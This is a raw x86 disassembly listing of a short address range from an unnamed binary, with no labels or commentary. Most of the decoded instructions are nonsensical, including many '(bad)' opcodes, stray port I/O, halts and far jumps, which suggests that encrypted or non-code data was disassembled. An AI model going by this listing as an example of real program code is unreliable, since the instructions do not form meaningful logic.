  413878:	or     al,BYTE PTR [ebp-0x19]
  41387b:	out    0xdb,eax
  41387d:	fcomp  QWORD PTR [esi]
  41387f:	(bad)  
  413880:	(bad)  
  413881:	push   ebp
  413882:	sub    eax,0x9997f889
  413887:	jbe    0x41380d
  413889:	jge    0x41387e
  41388b:	push   cs
  41388c:	push   ebp
  41388d:	mov    ds:0x366f6039,eax
  413892:	add    ebp,DWORD PTR [edi+esi*2]
  413895:	xchg   ebp,eax
  413896:	cwde   
  413897:	jnp    0x413855
  413899:	sbb    eax,0xccb77ae3
  41389e:	test   al,0x1f
  4138a0:	adc    eax,0xa94d64d3
  4138a5:	cli    
  4138a6:	(bad)  
  4138a7:	pop    ecx
  4138a8:	cs push edi
  4138aa:	mov    ebp,0xe3b956bb
  4138af:	mov    ebp,DWORD PTR [ecx-0x25696323]
  4138b5:	mov    al,0x8f
  4138b7:	or     eax,0x70355e41
  4138bc:	mov    ch,dh
  4138be:	inc    edi
  4138bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138c0:	aas    
  4138c1:	xor    dl,ch
  4138c3:	(bad)  
  4138c4:	adc    DWORD PTR [ecx-0x7fabe5f7],ecx
  4138ca:	test   al,0xf8
  4138cc:	dec    edi
  4138cd:	push   0x6db13f8
  4138d2:	sbb    BYTE PTR [edi-0x5da3be0],bh
  4138d8:	into   
  4138d9:	in     eax,dx
  4138da:	inc    eax
  4138db:	dec    eax
  4138dc:	push   ds
  4138dd:	jecxz  0x413905
  4138df:	ja     0x413895
  4138e1:	push   edi
  4138e2:	std    
  4138e3:	cmp    ah,BYTE PTR [ebp+0x1fc00834]
  4138e9:	js     0x4138b3
  4138eb:	loopne 0x413880
  4138ed:	ja     0x41396c
  4138ef:	inc    eax
  4138f0:	xchg   esi,eax
  4138f1:	pop    esp
  4138f2:	xchg   BYTE PTR [ecx-0x6faad52e],ah
  4138f8:	mov    ebp,0xec0902e9
  4138fd:	sub    eax,0x14fadddf
  413902:	push   0x18
  413904:	jne    0x41393f
  413906:	jae    0x4138b4
  413908:	(bad)
  41390b:	scas   eax,DWORD PTR es:[edi]
  41390c:	in     eax,0x8
  41390e:	adc    eax,0x270097a5
  413913:	retf   0xeebb
  413916:	lock xchg ecx,eax
  413918:	cmp    ecx,DWORD PTR [esi]
  41391a:	sub    DWORD PTR [esi-0x3ac76db2],ebx
  413920:	pop    esi
  413921:	jmp    0x4138a4
  413923:	loopne 0x4138fc
  413925:	ins    DWORD PTR es:[edi],dx
  413926:	dec    ebx
  413927:	fld    TBYTE PTR [esi]
  413929:	shl    eax,cl
  41392b:	in     al,0x51
  41392d:	jne    0x4139aa
  41392f:	shl    DWORD PTR ds:0xa3d2cad2,cl
  413935:	icebp  
  413936:	ins    DWORD PTR es:[edi],dx
  413937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413938:	mov    esi,0x6ef436b6
  41393d:	jg     0x4138cf
  41393f:	mov    ebx,0xedc336c0
  413944:	rcl    ebx,0xcd
  413947:	adc    ebp,DWORD PTR [edi-0x6de6bb18]
  41394d:	pop    es
  41394e:	jcxz   0x413909
  413951:	mul    BYTE PTR [edx]
  413953:	ret    0x4b8c
  413956:	xor    eax,0x417cea85
  41395b:	pop    ds
  41395c:	hlt    
  41395d:	push   ecx
  41395e:	inc    eax
  41395f:	in     eax,0xe8
  413961:	add    al,0x2b
  413963:	xlat   BYTE PTR ds:[ebx]
  413964:	sub    bh,dl
  413966:	test   DWORD PTR [ecx],ecx
  413968:	pop    esp
  413969:	pop    ds
  41396a:	dec    eax
  41396b:	jle    0x413993
  41396d:	test   BYTE PTR [esi+0x3b56795b],bl
  413973:	sbb    eax,0xfe79c196
  413978:	xchg   BYTE PTR [edi-0x250d3d92],cl
  41397e:	cmp    edi,DWORD PTR [edi]
  413980:	les    esp,FWORD PTR [ecx]
  413982:	loop   0x413955
  413984:	outs   dx,DWORD PTR ds:[esi]
  413985:	call   0x5857:0xfe88b5c9
  41398c:	mov    ecx,0x3b85715
  413991:	(bad)  
  413992:	es xchg ebx,eax
  413994:	add    edi,DWORD PTR [eax]
  413996:	bswap  edi
  413998:	fcmovb st,st(7)
  41399a:	xchg   ecx,eax
  41399b:	mov    ecx,0xed3e30f8
  4139a0:	mov    ebx,0xf72ca627
  4139a5:	inc    edx
  4139a6:	xor    BYTE PTR [ebp+0x583e2ed4],cl
  4139ac:	shr    BYTE PTR ds:0x72ba36a2,0xd3
  4139b3:	jb     0x4139bf
  4139b5:	pop    es
  4139b6:	hlt    
  4139b7:	imul   ecx,DWORD PTR [eax-0x27709da1],0x142a159f
  4139c1:	mov    bl,0xa5
  4139c3:	(bad)  
  4139c5:	test   BYTE PTR [edi],bh
  4139c7:	outs   dx,BYTE PTR ds:[esi]
  4139c8:	add    dl,0x2c
  4139cb:	call   FWORD PTR [ebx+esi*8+0x39e3d84e]
  4139d2:	imul   esi,DWORD PTR [ecx+ebp*4+0x6e],0x7e
  4139d7:	(bad)  
  4139d9:	or     DWORD PTR [ecx+edi*1],esi
  4139dc:	or     al,0x76
  4139de:	mov    ch,0x8e
  4139e0:	dec    ebx
  4139e1:	or     cl,BYTE PTR ds:0xa7e72f98
  4139e7:	rcr    BYTE PTR [esi],cl
  4139e9:	mov    esi,0xb589d6ed
  4139ee:	inc    edx
  4139ef:	xchg   ecx,eax
  4139f0:	adc    al,0xad
  4139f2:	pop    ss
  4139f3:	mov    eax,0x89b731
  4139f8:	nop
  4139f9:	fsubr  DWORD PTR [ebp+0x62]
  4139fc:	inc    ecx
  4139fd:	mov    ch,0x73
  4139ff:	mov    BYTE PTR [eax],ch
  413a01:	add    dh,bl
  413a03:	inc    esi
  413a04:	mov    ds:0x57e2ac03,al
  413a09:	(bad)
  413a0c:	call   0x24ef:0x20763433
  413a13:	xor    eax,0x116a0be6
  413a18:	out    0xf7,eax
  413a1a:	(bad)  
  413a1b:	popf   
  413a1c:	xor    eax,DWORD PTR ds:0xc4da6cea
  413a22:	pop    edi
  413a23:	repnz adc bl,dl
  413a26:	mov    dl,0x6e
  413a28:	dec    eax
  413a29:	push   eax
  413a2a:	xor    eax,0x58204c8d
  413a2f:	stc    
  413a30:	ss mov eax,0x45e39347
  413a36:	out    dx,eax
  413a37:	push   ebx
  413a38:	in     eax,dx
  413a39:	(bad)
  413a3c:	xor    BYTE PTR [ecx],0x44
  413a3f:	fptan  
  413a41:	fs pop edi
  413a43:	or     bh,BYTE PTR [edx-0x15673b63]
  413a49:	in     al,dx
  413a4a:	loop   0x413a07
  413a4c:	mov    ecx,0x2b1c1f4e
  413a51:	pop    ds
  413a52:	hlt    
  413a53:	ret    0x133e
  413a56:	in     eax,dx
  413a57:	aas    
  413a58:	sub    al,0x3a
  413a5a:	jmp    0xf73c:0xba103780
  413a61:	push   esp
  413a62:	jecxz  0x4139f9
  413a64:	out    0xe9,al
  413a66:	mov    ds:0x5244ccbb,al
  413a6b:	xor    esp,esp
  413a6d:	cmp    BYTE PTR [ebx-0x13],0xd6
  413a71:	mul    DWORD PTR [ecx+esi*4+0x723b4c96]
  413a78:	or     DWORD PTR [eax+0x5a26104b],0x80a2571a
  413a82:	test   bh,cl
  413a84:	pusha  
  413a85:	pop    ss
  413a86:	mov    BYTE PTR [edi+0xf2df93],0x64
  413a8d:	repz xor ah,BYTE PTR [edi+ecx*8]
  413a91:	mov    ebp,0x7aae3f6
  413a96:	bound  esp,QWORD PTR [eax-0x29]
  413a99:	repnz dec edx
  413a9b:	(bad)  
  413a9c:	ficomp DWORD PTR [ebx+edx*4+0xd0779d4]
  413aa3:	xchg   edi,eax
  413aa4:	cld    
  413aa5:	and    bh,BYTE PTR [ebx-0x2e]
  413aa8:	xchg   edi,eax
  413aa9:	test   DWORD PTR [esi+ebp*2-0xf604297],ebx
  413ab0:	ret    
  413ab1:	or     BYTE PTR [ebp-0x20],bl
  413ab4:	imul   ebx,DWORD PTR [ebx+ecx*8+0x78b1589],0xffffffb8
  413abc:	dec    ebx
  413abd:	jno    0x413a97
  413abf:	mov    cl,0xb9
  413ac1:	dec    ebx
  413ac2:	repz dec esp
  413ac4:	loop   0x413ab0
  413ac6:	in     al,0x36
  413ac8:	xor    DWORD PTR [ebx-0x29],0x6224cd08
  413acf:	fnstenv [ecx+0x2242a7db]
  413ad5:	inc    ecx
  413ad6:	fwait
  413ad7:	xor    DWORD PTR [edx+0x33],edx
  413ada:	inc    eax
  413adb:	add    al,0x92
  413add:	jbe    0x413a84
  413adf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ae0:	lea    ecx,[edi+0x6396f4d8]
  413ae6:	dec    eax
  413ae7:	and    eax,0x1be6ea2a
  413aec:	cwde   
  413aed:	ds (bad) 
  413aef:	mov    bl,BYTE PTR ds:0x73ec4c68
  413af5:	jb     0x413b69
  413af7:	sbb    cl,ah
  413af9:	in     eax,dx
  413afa:	ja     0x413b67
  413afc:	sbb    eax,0x46406e6f
  413b01:	daa    
  413b02:	fild   WORD PTR [ebx]
  413b04:	jmp    0x9878:0xfed9c2b0
  413b0b:	test   DWORD PTR [esi-0x25],esp
  413b0e:	mov    esi,0x554e8eea
  413b13:	push   0xfffffffb
  413b15:	lods   eax,DWORD PTR ds:[esi]
  413b16:	pop    ebp
  413b17:	cmp    ah,0x15
  413b1a:	push   ss
  413b1b:	jge    0x413b5b
  413b1d:	das    
  413b1e:	jle    0x413b57
  413b20:	imul   edx
  413b22:	ds jbe 0x413ab5
  413b25:	mov    ah,0xaa
  413b27:	pushf  
  413b28:	retf   
  413b29:	jo     0x413b66
  413b2b:	xchg   dh,ch
  413b2d:	mov    edx,0x2496c86f
  413b32:	push   edi
  413b33:	push   ebp
  413b34:	cli    
  413b35:	out    dx,eax
  413b36:	mov    DWORD PTR [ecx],esi
  413b38:	push   0xffffffe0
  413b3a:	pop    ss
  413b3b:	mov    cl,0xe2
  413b3d:	mov    edi,0x708b3341
  413b42:	rol    DWORD PTR [esi-0x57],cl
  413b45:	inc    edx
  413b46:	adc    eax,0xc94b2e4e
  413b4b:	adc    cl,BYTE PTR [edi+eax*4]
  413b4e:	sub    dl,BYTE PTR [edi]
  413b50:	sbb    BYTE PTR [ebp-0x22],al
  413b53:	pop    es
  413b54:	(bad)  
  413b55:	lea    ecx,[edi]
  413b57:	xor    al,0x7f
  413b59:	aaa    
  413b5a:	adc    eax,0x6ca2e90b
  413b5f:	loopne 0x413ba8
  413b61:	push   esi
  413b62:	and    eax,0xf9fa7cf2
  413b67:	repnz add BYTE PTR [edx-0xa],al
  413b6b:	outs   dx,BYTE PTR ds:[esi]
  413b6c:	fdiv   QWORD PTR [edi-0x77]
  413b6f:	out    0x10,al
  413b71:	test   al,0xeb
  413b73:	sbb    BYTE PTR [edx+0x4bd5b24d],cl
  413b79:	jb     0x413bad
  413b7b:	ss in  al,dx
  413b7d:	mov    ds:0x3111eed6,al
  413b82:	sar    BYTE PTR [eax],cl
  413b84:	xchg   esp,eax
  413b85:	repz dec esp
  413b87:	ret    
  413b88:	push   esp
  413b89:	cmp    DWORD PTR [ebp+0x6],ecx
  413b8c:	ss ret 
  413b8e:	add    eax,edx
  413b90:	jle    0x413bd0
  413b92:	in     al,0xd4
  413b94:	adc    al,0xa6
  413b96:	adc    ecx,DWORD PTR [edx+0x12]
  413b99:	and    esi,esp
  413b9b:	das    
  413b9c:	and    ch,BYTE PTR [ecx-0x7b]
  413b9f:	jne    0x413bb6
  413ba1:	sbb    ch,BYTE PTR ss:[edx-0x4ecdc406]
  413ba8:	dec    bh
  413baa:	dec    edi
  413bab:	lods   eax,DWORD PTR ds:[esi]
  413bac:	idiv   DWORD PTR [esi+0x68]
  413baf:	cwde   
  413bb0:	imul   ebp,DWORD PTR [ebx-0xf15b02a],0xffffff9c
  413bb7:	ficom  WORD PTR [ebx+0x32]
  413bba:	push   0xf4af8608
  413bbf:	cmp    DWORD PTR [ebp+0x75e7fd64],edx
  413bc5:	add    eax,DWORD PTR [eax+0x73]
  413bc8:	outs   dx,DWORD PTR ds:[esi]
  413bc9:	sbb    bl,BYTE PTR [ecx-0x2]
  413bcc:	iret   
  413bcd:	imul   esi,DWORD PTR [edx+ebp*4-0x58],0x44a86f2c
  413bd5:	daa    
  413bd6:	inc    eax
  413bd7:	and    al,0x9c
  413bd9:	mov    bh,0xdc
  413bdb:	mov    dl,0x89
  413bdd:	out    dx,eax
  413bde:	and    BYTE PTR ds:0xc3e4f52d,bh
  413be4:	mov    esi,0x37ec118a
  413be9:	inc    DWORD PTR [edi-0x6f]
  413bec:	inc    ebp
  413bed:	sbb    DWORD PTR [ebx+0x37],edx
  413bf0:	scas   eax,DWORD PTR es:[edi]
  413bf1:	mov    bh,0x69
  413bf3:	out    dx,eax
  413bf4:	cmp    edx,DWORD PTR [ecx-0x236cee99]
  413bfa:	lods   al,BYTE PTR ds:[esi]
  413bfb:	dec    ebp
  413bfc:	popa   
  413bfd:	jnp    0x413c76
  413bff:	aaa    
  413c00:	or     eax,DWORD PTR [esi+0x46867f25]
  413c06:	es xor eax,0x353f2b0
  413c0c:	retf   0xd96c
  413c0f:	or     DWORD PTR [edi],esp
  413c11:	popf   
  413c12:	push   edx
  413c13:	dec    eax
  413c14:	pop    edx
  413c15:	mov    ?,ecx
  413c17:	in     eax,dx
  413c18:	jmp    0x413c38
  413c1a:	xchg   esi,eax
  413c1b:	xchg   BYTE PTR [esi+0x2],dl
  413c1e:	mov    eax,ebp
  413c20:	and    DWORD PTR ds:[ecx-0x37],edx
  413c24:	inc    esi
  413c25:	(bad)  
  413c26:	scas   eax,DWORD PTR es:[edi]
  413c27:	(bad)  
  413c28:	aam    0x14
  413c2a:	rol    esp,1
  413c2c:	mov    edi,0xea5a579f
  413c31:	jae    0x413c43
  413c33:	mov    ds:0x848f7b7e,al
  413c38:	aaa    
  413c39:	sti    
  413c3a:	sub    DWORD PTR cs:[edx+0x35],ebx
  413c3e:	mov    ebx,esp
  413c40:	xlat   BYTE PTR ds:[ebx]
  413c41:	or     BYTE PTR [esi],bh
  413c43:	inc    eax
  413c44:	pop    ebp
  413c45:	fbstp  TBYTE PTR [eax]
  413c47:	ins    DWORD PTR es:[edi],dx
  413c48:	mov    bh,0x87
  413c4a:	outs   dx,DWORD PTR ds:[esi]
  413c4b:	sahf   
  413c4c:	jp     0x413cbe
  413c4e:	jg     0x413c82
  413c50:	xchg   BYTE PTR [eax-0x3c],bh
  413c53:	jg     0x413c15
  413c55:	cmp    ah,BYTE PTR [ebp-0x72]
  413c58:	jo     0x413c37
  413c5a:	mov    BYTE PTR ds:0x747d3844,ch
  413c60:	jmp    0xc5ac:0x5a459199
  413c67:	inc    edx
  413c68:	pop    esi
  413c69:	jmp    0x413c09
  413c6b:	dec    esi
  413c6c:	xchg   edi,eax
  413c6d:	dec    esi
  413c6e:	jns    0x413c5e
  413c70:	fiadd  WORD PTR [edi-0x4a88c1fa]
  413c76:	sti    
  413c77:	iret   
  413c78:	dec    eax
  413c79:	les    edx,FWORD PTR [ebp-0x779f1ef5]
  413c7f:	xor    BYTE PTR [edx],dh
  413c81:	ja     0x413cc5
  413c83:	mov    ebx,0xed0e602f
  413c88:	lds    esi,FWORD PTR ss:[eax-0x165a0f1f]
  413c8f:	dec    edi
  413c90:	jnp    0x413c15
  413c92:	jae    0x413c68
  413c94:	xchg   esp,eax
  413c95:	dec    ecx
  413c96:	mov    BYTE PTR [edx],cl
  413c98:	repz adc al,0xaa
  413c9b:	mov    ds:0x1c171c8b,al
  413ca0:	pop    eax
  413ca1:	retf   
  413ca2:	xlat   BYTE PTR ds:[ebx]
  413ca3:	and    ch,dl
  413ca5:	mov    DWORD PTR [ecx],eax
  413ca7:	pop    edi
  413ca8:	(bad)  
  413ca9:	sub    edx,DWORD PTR [ebx-0x54]
  413cac:	jb     0x413ceb
  413cae:	call   0x9348c588
  413cb3:	cli    
  413cb4:	in     eax,dx
  413cb5:	xor    eax,0x81d10637
  413cba:	sbb    al,0x12
  413cbc:	fld    TBYTE PTR [ebp-0x2c]
  413cbf:	cmp    al,0xb
  413cc1:	mov    edx,0xa15ae8a1
  413cc6:	pop    ds
  413cc7:	(bad)  
  413cc9:	and    eax,0xfc6beacc
  413cce:	add    eax,0xeeee35fa
  413cd3:	sbb    al,0x36
  413cd5:	mov    ch,BYTE PTR [edi-0x24]
  413cd8:	mov    ds:0xde7df759,eax
  413cdd:	(bad)  
  413cde:	cdq    
  413cdf:	fmul   DWORD PTR [eax+0x7f41d097]
  413ce5:	jl     0x413c82
  413ce7:	ins    DWORD PTR es:[edi],dx
  413ce8:	fcmovbe st,st(5)
  413cea:	shr    cl,cl
  413cec:	js     0x413cea
  413cee:	xor    ecx,ebx
  413cf0:	pop    esi
  413cf1:	bnd ja 0x413cd2
  413cf4:	mov    al,0x35
  413cf6:	call   0xa052dc7a
  413cfb:	mov    eax,DWORD PTR [eax]
  413cfd:	imul   esi,DWORD PTR [ebx],0x9078d43f
  413d03:	jp     0x413caf
  413d05:	enter  0xd6ae,0x2f
  413d09:	pop    ecx
  413d0a:	and    DWORD PTR [edx-0x2c3a72b9],ecx
  413d10:	int3   
  413d11:	scas   al,BYTE PTR es:[edi]
  413d12:	pushf  
  413d13:	inc    ecx
  413d14:	or     eax,DWORD PTR [eax-0x4c]
  413d17:	or     bh,BYTE PTR [ecx+0x1c326078]
  413d1d:	sub    DWORD PTR [esp+esi*4],esp
  413d20:	mov    al,ds:0x4aa557c8
  413d25:	mov    cl,0x2c
  413d27:	in     al,dx
  413d28:	mov    ebp,0x3dff9f77
  413d2d:	(bad)  
  413d2e:	scas   eax,DWORD PTR es:[edi]
  413d2f:	test   al,0xaa
  413d31:	test   al,0x8f
  413d33:	push   esp
  413d34:	cmp    dl,BYTE PTR [edi-0x29c2df86]
  413d3a:	lea    ecx,[ebx]
  413d3c:	cmp    BYTE PTR [ebp-0x47],0xce
  413d40:	test   BYTE PTR [ebx-0x61130c77],bh
  413d46:	les    edx,FWORD PTR [ebp-0x40b8a396]
  413d4c:	pushf  
  413d4d:	ret    
  413d4e:	jmp    0x413d10
  413d50:	outs   dx,BYTE PTR ds:[esi]
  413d51:	mov    cl,0x76
  413d53:	and    esi,DWORD PTR [edi-0x4f]
  413d56:	cmp    DWORD PTR [ebx],ebp
  413d58:	into   
  413d59:	cs and eax,0x61508a41
  413d5f:	iret   
  413d60:	or     BYTE PTR [esi+0x46],0x1c
  413d64:	mov    ds:0x55f870ce,al
  413d69:	push   es
  413d6a:	jnp    0x413db7
  413d6c:	and    al,0x15
  413d6e:	(bad)  
  413d6f:	push   ecx
  413d70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d71:	ss inc ebx
  413d73:	leave  
  413d74:	push   eax
  413d75:	pop    esi
  413d76:	add    DWORD PTR [eax+0x76],eax
  413d79:	inc    edi
  413d7b:	ret    0x6fc6
  413d7e:	dec    BYTE PTR [ecx+0x66732354]
  413d84:	js     0x413d92
  413d86:	outs   dx,BYTE PTR ds:[esi]
  413d87:	pop    esp
  413d88:	aas    
  413d89:	aam    0x41
  413d8b:	jb     0x413de8
  413d8d:	jecxz  0x413d94
  413d8f:	jb     0x413dd4
  413d91:	rol    BYTE PTR [edi+0x6075fa7a],cl
  413d97:	jae    0x413d22
  413d99:	lahf   
  413d9a:	(bad)  
  413d9c:	and    DWORD PTR [eax],0x6c2eeb9f
  413da2:	sub    al,0x9a
  413da4:	pop    ds
  413da5:	mov    ebx,0x38656462
  413daa:	(bad)  
  413dab:	dec    BYTE PTR [edi+0x1ed6898b]
  413db1:	jb     0x413e20
  413db3:	push   ebx
  413db4:	aas    
  413db5:	test   cl,bl
  413db7:	pop    es
  413db8:	sbb    dl,0x86
  413dbb:	ds cwde 
  413dbd:	int    0xf5
  413dbf:	addr16 push ebx
  413dc1:	lods   eax,DWORD PTR ds:[esi]
  413dc2:	lds    eax,FWORD PTR [eax-0x26]
  413dc5:	mov    DWORD PTR [esi+0x7c834c2a],edi
  413dcb:	mov    bl,0xaa
  413dcd:	pop    esp
  413dce:	cs cmp al,0xb9
  413dd1:	scas   al,BYTE PTR es:[edi]
  413dd2:	pop    ss
  413dd3:	rol    DWORD PTR [eax-0x42946fd7],1
  413dd9:	inc    esi
  413dda:	push   edx
  413ddb:	xchg   ah,ah
  413ddd:	push   0x1e
  413ddf:	outs   dx,BYTE PTR ds:[esi]
  413de0:	dec    edx
  413de1:	neg    BYTE PTR ds:0x24c61913
  413de7:	ja     0x413e5a
  413de9:	jmp    FWORD PTR [ecx]
  413deb:	test   eax,0x7d4c10cc
  413df0:	push   ecx
  413df1:	sar    bl,1
  413df3:	adc    edx,DWORD PTR [edi]
  413df5:	sar    ch,0xfd
  413df8:	jae    0x413d9e
  413dfa:	sti    
  413dfb:	popa   
  413dfc:	and    DWORD PTR [ecx+0x3b],edx
  413dff:	cmp    BYTE PTR [edx],0xa7
  413e02:	jae    0x413e82
  413e04:	xor    ebx,ecx
  413e06:	gs or  eax,0x61742e4b
  413e0c:	inc    edx
  413e0d:	inc    eax
  413e0e:	test   al,0x19
  413e10:	out    dx,al
  413e11:	jmp    0x413e85
  413e13:	dec    esp
  413e14:	pop    eax
  413e15:	jg     0x413e12
  413e17:	pop    DWORD PTR [ebp-0x58]
  413e1a:	sahf   
  413e1b:	inc    ebp
  413e1c:	inc    ebp
  413e1d:	mov    eax,0x73e00ec1
  413e22:	xor    eax,0x2c00351a
  413e27:	push   esi
  413e28:	dec    esp
  413e29:	mov    ds:0xa3b207c9,eax
  413e2e:	lock dec edi
  413e30:	cmp    BYTE PTR [esi-0x3a1e7dcc],bl
  413e36:	repz inc ebx
  413e38:	cmp    eax,0xb78a1341
  413e3d:	pop    ds
  413e3e:	inc    esp
  413e3f:	pop    ss
  413e40:	(bad)  
  413e41:	and    ch,BYTE PTR [edx-0x4fd9f746]
  413e47:	mov    ds:0x7fc3368f,eax
  413e4c:	inc    esi
  413e4d:	xor    ebx,DWORD PTR [ebx]
  413e4f:	inc    ecx
  413e50:	or     eax,0xed00a9fe
  413e55:	pop    esi
  413e56:	mov    ch,0x15
  413e58:	mov    cl,0x6c
  413e5a:	jl     0x413dfb
  413e5c:	pop    ebx
  413e5d:	retf   0x3669
  413e60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e61:	push   ss
  413e62:	imul   edx,ebx,0x15abb4a2
  413e68:	dec    ebp
  413e69:	dec    ebp
  413e6a:	cli    
  413e6b:	lods   al,BYTE PTR ds:[esi]
  413e6c:	bound  ebx,QWORD PTR [ecx+edi*4]
  413e6f:	leave  
  413e70:	ret    0x5bf9
  413e73:	sbb    dh,BYTE PTR [edx*8-0x2595ecc3]
  413e7a:	mov    ebx,ds
  413e7c:	ins    DWORD PTR es:[edi],dx
  413e7d:	repz sub al,0x6c
  413e80:	inc    eax
  413e81:	jne    0x413ed0
  413e83:	sahf   
  413e84:	jl     0x413ec7
  413e86:	ins    BYTE PTR es:[edi],dx
  413e87:	(bad)  
  413e89:	sub    al,0x5e
  413e8b:	and    al,0x5e
  413e8d:	iret   
  413e8e:	popa   
  413e8f:	in     al,dx
  413e90:	adc    bh,BYTE PTR [ecx+0x42]
  413e93:	(bad)  
  413e94:	push   edx
  413e95:	sbb    dh,cl
  413e97:	adc    ebx,ebp
  413e99:	ret    0xfa5f
  413e9c:	fidivr DWORD PTR [edi]
  413e9e:	cs (bad) 
  413ea1:	(bad)  
  413ea2:	popf   
  413ea3:	sbb    cl,BYTE PTR [esi-0x32954e80]
  413ea9:	lahf   
  413eaa:	push   es
  413eab:	gs jne 0x413eb2
  413eae:	jne    0x413e42
  413eb0:	mov    edx,0x26d2aace
  413eb5:	stc    
  413eb6:	pop    eax
  413eb7:	push   es
  413eb8:	or     eax,0x342ce802
  413ebd:	cmc    
  413ebe:	pop    ecx
  413ebf:	in     al,dx
  413ec0:	push   ebx
  413ec1:	xor    ah,al
  413ec3:	aaa    
  413ec4:	fsubr  QWORD PTR [eax-0x38029504]
  413eca:	push   ebx
  413ecb:	call   0xdd5174e
  413ed0:	jmp    DWORD PTR [eax]
  413ed2:	test   BYTE PTR [edi+0xd7df793],0x95
  413ed9:	xor    ch,BYTE PTR [ebx]
  413edb:	fstp   QWORD PTR [eax-0x33]
  413ede:	ret    
  413edf:	inc    esi
  413ee0:	pop    ebp
  413ee1:	pusha  
  413ee2:	jl     0x413f5e
  413ee4:	fsub   DWORD PTR [edi]
  413ee6:	repnz ins BYTE PTR es:[edi],dx
  413ee8:	mov    DWORD PTR [ecx+0x1f],ebx
  413eeb:	out    0x3,al
  413eed:	idiv   BYTE PTR [ebx+0x9]
  413ef0:	mov    ebp,DWORD PTR [eax+0x64]
  413ef3:	mov    esp,0xf3568348
  413ef8:	mov    WORD PTR [ebx+0x34ca3c03],ss
  413efe:	mov    dl,cl
  413f00:	inc    ecx
  413f01:	idiv   DWORD PTR [ebx+eiz*1+0x6c]
  413f05:	cdq    
  413f06:	das    
  413f07:	push   0x4a
  413f09:	adc    al,0x4
  413f0b:	pop    ebp
  413f0c:	sub    al,BYTE PTR [ecx+ebp*4-0x6faad7d5]
  413f13:	and    DWORD PTR [ebp+0x5eacc5d8],ebx
  413f19:	ror    bh,1
  413f1b:	leave  
  413f1c:	mov    dl,0xf6
  413f1e:	sti    
  413f1f:	popa   
  413f20:	jmp    DWORD PTR [eax-0x4fc51acb]
  413f26:	(bad)  
  413f27:	mov    cl,0xc7
  413f29:	and    al,0x6c
  413f2b:	cwde   
  413f2c:	daa    
  413f2d:	adc    al,ch
  413f2f:	add    eax,0xfe4aa4e9
  413f34:	cmp    BYTE PTR [edi+0x68432009],ah
  413f3a:	shl    DWORD PTR [eax+0xe],0x39
  413f3e:	test   BYTE PTR [ecx-0x4e],0x33
  413f42:	call   0x1a2b:0xd9c595fd
  413f49:	adc    BYTE PTR [ecx-0x36],0x8e
  413f4d:	popa   
  413f4e:	pop    ecx
  413f4f:	outs   dx,DWORD PTR ds:[esi]
  413f50:	fs leave 
  413f52:	pop    eax
  413f53:	stc    
  413f54:	adc    al,0xcc
  413f56:	retf   
  413f57:	push   esi
  413f58:	aad    0xec
  413f5a:	inc    eax
  413f5b:	fcom   QWORD PTR [edx+ecx*1]
  413f5e:	mov    dh,0x5a
  413f60:	scas   eax,DWORD PTR es:[edi]
  413f61:	sub    al,0x52
  413f63:	scas   al,BYTE PTR es:[edi]
  413f64:	xor    BYTE PTR [esi-0x5f5d6a45],dl
  413f6a:	inc    edi
  413f6b:	sub    ah,bl
  413f6d:	cs xchg esi,eax
  413f6f:	push   ecx
  413f70:	xchg   edi,eax
  413f71:	jmp    0x6f07:0xf513fc52
  413f78:	pop    ebp
  413f79:	jle    0x413f55
  413f7b:	les    ecx,FWORD PTR [ebp+0x1efd2550]
  413f81:	and    edx,DWORD PTR [ebx]
  413f83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f84:	xor    eax,0xc42a032e
  413f89:	push   esi
  413f8a:	push   ebx
  413f8b:	imul   ebp,DWORD PTR [ebx+0x60a6b256],0xd27d3ccd
  413f95:	mov    esi,0x74d3577f
  413f9a:	sbb    al,0x85
  413f9c:	js     0x413f59
  413f9e:	stc    
  413f9f:	fwait
  413fa0:	stos   DWORD PTR es:[edi],eax
  413fa1:	test   eax,0x29d785d6
  413fa6:	inc    esp
  413fa7:	pop    edx
  413fa8:	add    edx,DWORD PTR [edi-0x4409c799]
  413fae:	rcl    BYTE PTR [ecx+0x3],1
  413fb1:	mov    ah,0x45
  413fb3:	xor    BYTE PTR [edi],dh
  413fb5:	cmc    
  413fb6:	dec    esi
  413fb7:	aaa    
  413fb8:	enter  0x5dae,0x91
  413fbc:	mov    ch,0xf7
  413fbe:	test   edx,0xbef1eba
  413fc4:	cld    
  413fc5:	call   0xf4c4:0x3dc8a139
  413fcc:	fs ss inc eax
  413fcf:	ss in  al,0xe5
  413fd2:	mov    al,0xba
  413fd4:	jp     0x413fe1
  413fd6:	(bad)  
  413fd7:	adc    BYTE PTR [esi-0x6e3bfe31],bh
  413fdd:	rcr    DWORD PTR gs:[edi+0x68998c09],0xbb
  413fe5:	aas    
  413fe6:	pusha  
  413fe7:	inc    ecx
  413fe8:	adc    al,0x53
  413fea:	icebp  
  413feb:	cmp    eax,0x99822676
  413ff0:	jns    0x41406a
  413ff2:	dec    ecx
  413ff3:	mov    ecx,0x42745a92
  413ff8:	call   0x9d6e27d0
  413ffd:	mov    dh,0x5a
  413fff:	rcr    DWORD PTR [edx-0x931e833],cl
  414005:	mov    ah,0x39
  414007:	mov    cl,0x2b
  414009:	xchg   edi,eax
  41400a:	(bad)  
  41400b:	(bad)  
  41400c:	sbb    cl,BYTE PTR [esi]
  41400e:	call   0x35dc324b
  414013:	push   0x6f825498
  414018:	aam    0x8e
  41401a:	mov    ds:0x92e649b9,al
  41401f:	shl    esi,1
  414021:	sub    BYTE PTR [ebp+0x2c],dh
  414024:	test   al,0xc7
  414026:	out    dx,eax
  414027:	cmp    eax,0x82dacc11
  41402c:	jg     0x414076
  41402e:	and    al,0xe
  414030:	stc    
  414031:	xor    BYTE PTR [edi+edx*4-0x25],ch
  414035:	and    DWORD PTR [ebp+ebp*2+0x3f],esp
  414039:	mov    WORD PTR [ebp-0x1d],ds
  41403c:	sbb    ebp,DWORD PTR [edx+0x2911761f]
  414042:	xchg   edi,eax
  414043:	es sbb al,0x82
  414046:	in     eax,0xd6
  414048:	sbb    ebp,DWORD PTR [ecx+0x50b55d93]
  41404e:	(bad)  [ebx+0x325af96]
  414054:	(bad)  
  414055:	push   edx
  414056:	cmp    al,0xc2
  414058:	jmp    0x55328fe1
  41405d:	outs   dx,DWORD PTR ds:[esi]
  41405e:	(bad)  
